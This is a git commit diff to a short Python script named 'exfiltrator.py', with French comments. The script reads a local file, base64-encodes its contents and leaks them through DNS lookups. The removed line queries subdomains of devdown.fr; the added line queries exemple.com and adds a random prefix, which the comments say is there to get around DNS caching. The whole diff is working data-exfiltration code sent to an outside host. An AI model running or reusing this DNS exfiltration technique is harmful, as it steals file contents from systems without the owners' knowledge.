767fc4a57d234da8880ebc7c587110aaef5826cc
Jorropo <jorropo.pgm@gmail.com>
2018-04-03 04:50:14 +0200

    Update exfiltrator.py

--- outer/exfiltrator.py
+++ outer/exfiltrator.py
@@ -1,6 +1,7 @@
 #/usr/bin/env python3
 import socket
 import base64
+import random
 f = open("toOut/test.txt", "r") #on ouvre le fichier à exflitrer
-socket.gethostbyname(base64.b64encode(f.read().encode("utf-8")).decode("utf-8")+".devdown.fr") #on encode le fichier en base64 et on fait une requete dns sur XXXX.devdown.fr (xxxx est le fichier encoder en base 64)
+socket.gethostbyname(str(random.random())+".separator."+str(base64.b64encode(f.read().encode("utf-8")))+".exemple.com") #on encode le fichier en base64 et on fait une requete dns sur random.separator.xxxx.exemple.com (xxxx est le fichier encoder en base 64) (random est nombre pour contourner le dns buffering)
 f.close() #on ferme le fichier
